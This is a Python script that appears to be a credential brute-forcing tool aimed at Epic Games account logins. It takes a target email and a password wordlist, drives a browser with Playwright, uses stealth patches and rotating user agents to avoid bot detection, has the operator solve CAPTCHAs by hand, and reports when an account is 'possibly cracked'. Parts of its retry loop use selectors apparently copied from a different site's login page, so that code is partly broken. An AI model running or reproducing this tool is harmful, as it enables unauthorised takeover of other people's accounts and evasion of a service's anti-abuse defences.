import sys
import atexit
import cursor
import getpass
import typing
from typing import Optional
from playwright.sync_api import sync_playwright,  TimeoutError as PlaywrightTimeoutError
from playwright_stealth import stealth_sync
import time
import random
import os
import pyfiglet
from colorama import just_fix_windows_console, Fore, Back, Style
from pathlib import Path

""" CURRENT ERROR :
    enable javascript and cookies to continue
"""

class EpicGames():
    browser_select = {
        "1.": "Chromium",
        "2.": "Firefox",
        "3.": "Webkit",
        "4.": "Random"
    }


    def __init__(self):
        self.epicURL = "https://www.epicgames.com/id/login?lang=en-US&noHostRedirect=true&redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&client_id=875a3b57d3a640a6b7f9b4e883463ab4"

        self.target = None
        self.password_file = None

        self.alert = None
        self.invalid_selection = (Fore.RED + "Invalid Selection" + Style.RESET_ALL).center(50)

        self.passwords: list[str] = []
        self.password_counter: int = 0
        self.total_passwords: int = 0
        self.validation_check: bool = True
        self.webbrowsers: list[str] = ["chromium", "firefox", "webkit"]
        self.webbrowser = None

        self.agents: list[str] = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_0; rv:112.0) Gecko/20100101 Firefox/112.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Pixel 5 Build/TQ3A.230305.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/112.0.0.0",
            "Mozilla/5.0 (Linux; Android 13; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/112.0.0.0 Mobile Safari/537.36"
        ]


    @staticmethod
    def clear_screen():
        os.system("cls" if os.name == "nt" else "clear")

    @staticmethod
    @atexit.register
    def cleanup():
        cursor.show()

    def header(self):
        print(pyfiglet.figlet_format("Epic Games", font="doom"))

    def reset_alert(self):
        self.alert = None

    def show_alert(self):
        print(self.alert + "\n\n" if self.alert and self.alert is not None else "\n\n")

    def attack(self):
        confirmed = False
        while not confirmed:
            self.clear_screen()
            self.header()
            target = input("Target Email: ").strip()
            password_file = input("Path to password list: ").strip()
            if not password_file.endswith(".txt"):
                password_file = password_file + ".txt"
            
            password_file = Path(password_file)
            
            print("\n\n")
            print(f"TARGET EMAIL: {target}")
            print(f"PASSWORD PATH: {password_file.absolute()}")
            print()
            choice = input("Is this correct [y/N]? ")
            confirmed = True if choice[0].lower() == "y" else False

        self.target = target
        self.password_file = password_file
        self.read_passwords()
        self.launch_browser()


    def read_passwords(self):
        try:
            with open(self.password_file, "r", encoding="UTF-8") as pwd_list:
                lines = pwd_list.readlines()
                for line in lines:
                    self.passwords.append(line.strip())
                    self.total_passwords += 1
        except FileNotFoundError:
            print(f"\n{Fore.RED}ERROR{Style.RESET_ALL}: File '{self.password_file}' Not Found. Try placing in root or giving full path.")
            cursor.hide()
            getpass.getpass("Press Enter to go back to menu")
            cursor.show()
            raise Exception("File Error")
    
    def choose_browser(self):
        choice = None
        while choice is None:
            self.clear_screen()
            self.header()
            self.show_alert()

            print("Choose a webbrowser")
            for k, v in self.browser_select.items():
                print(f"{k}. {v}")
            print()
            choice = input(">> ")
            if choice == "1":
                self.webbrowser = "chromium"
            elif choice == "2":
                self.webbrowser = "firefox"
            elif choice == "3":
                self.webbrowser = "webkit"
            elif choice == "4":
                self.webbrowser = random.choice(self.webbrowsers)
            else:
                self.alert = self.invalid_selection
                choice = None

    def launch_browser(self):
        self.choose_browser()

        validation_check = False
        
        with sync_playwright() as playwright:
            if self.webbrowser == "chromium":
                browser = playwright.chromium.launch(headless=False)
            elif self.webbrowser == "firefox":
                browser = playwright.firefox.launch(headless=False)
            else:
                browser = playwright.webkit.launch(headless=False)

            user_agent: str = random.choice(self.agents)
            print(f"PROXY: N/A\nAGENT: {user_agent}\nBROWSER: {self.webbrowser.title()}\n\n\n")

            context = browser.new_context(user_agent=user_agent, java_script_enabled=True, )
            page = context.new_page()
            
            stealth_sync(page)

            page.goto(self.epicURL)

            print("Waiting for Email Field")
            page.locator('#email').wait_for(timeout=60000)
            print(f"Trying PASSWORD {self.password_counter + 1} of {self.total_passwords} : {self.passwords[self.password_counter]}")
            page.locator('#email').fill(self.target)
            page.locator('#password').fill(self.passwords[self.password_counter])
            page.locator('button', has_text="Sign in").first.click()

            page.pause()
            
            try:
                page.locator('div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid', has_text="Sorry, your password was incorrect. Please double-check your password.").wait_for(timeout=2500)
                validation_check = page.locator('div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid', has_text="Sorry, your password was incorrect. Please double-check your password.")
                validation_check = True
            except PlaywrightTimeoutError:
                try:
                    captcha_check = page.locator('div.x9f619.xjbqb8w.x78zum5.x168nmei.x13lgxp2.x5pf9jr.xo71vjh.xwxc41k.x1p5oq8j.x1n2onr6.x1plvlek.xryxfnj.x1c4vz4f.x2lah0s.xdt5ytf.xqjyukv.x1qjc9v5.x1oa3qoh.x1nhvcw1', has_text="We detected that your password is weak").wait_for(timeout=2500)
                    cursor.hide()
                    getpass.getpass("Do captcha and press enter when back on login page")
                    cursor.show()
                    validation_check = True
                except PlaywrightTimeoutError:
                    print("Failed to locate CAPTCHA or 'Password Incorrect' for 5 Seconds")

            if validation_check:
                try:
                    while  validation_check:
                        self.password_counter += 1
                        print(f"Trying PASSWORD {self.password_counter + 1} of {self.total_passwords} : {self.passwords[self.password_counter]}")
                        page.locator('text="Phone number, username, or email"').wait_for(timeout=60000)
                        page.locator('text="Phone number, username, or email"').fill(self.target)
                        page.locator('text="Password"').fill(self.passwords[self.password_counter])
                        page.locator('button', has_text="Log in").first.click()
                        
                        try:
                            page.locator('div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid', has_text="Sorry, your password was incorrect. Please double-check your password.").wait_for(timeout=1000)
                            validation_check = page.locator('div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid', has_text="Sorry, your password was incorrect. Please double-check your password.")
                            validation_check = True
                        except PlaywrightTimeoutError:
                            try:
                                captcha_check = page.locator('div.x9f619.xjbqb8w.x78zum5.x168nmei.x13lgxp2.x5pf9jr.xo71vjh.xwxc41k.x1p5oq8j.x1n2onr6.x1plvlek.xryxfnj.x1c4vz4f.x2lah0s.xdt5ytf.xqjyukv.x1qjc9v5.x1oa3qoh.x1nhvcw1', has_text="We detected that your password is weak").wait_for(timeout=5000)
                                cursor.hide()
                                getpass.getpass("Do captcha and press enter when back on login page")
                                cursor.show()
                            except PlaywrightTimeoutError:
                                print("Failed to locate CAPTCHA or 'Password Incorrect' for 5 Seconds\n\n\n")
                                validation_check = True
                        
                        if not validation_check:
                            print(f"Account possibly cracked\nPASSWORD: {self.passwords[self.password_counter]}")
                
                except IndexError:
                    print("End of Password List.\n\n")
            
            if not validation_check:
                print(f"Account possibly cracked\nPASSWORD: {self.passwords[self.password_counter]}")

            i = 0
            try:
                while i < 3:
                    input(f"press CTRL + C to go back or press enter {i} more times")
            except KeyboardInterrupt:
                browser.close()
                raise Exception("Browser Closed")














if __name__ == "__main__":
    epic = EpicGames()
    epic.attack()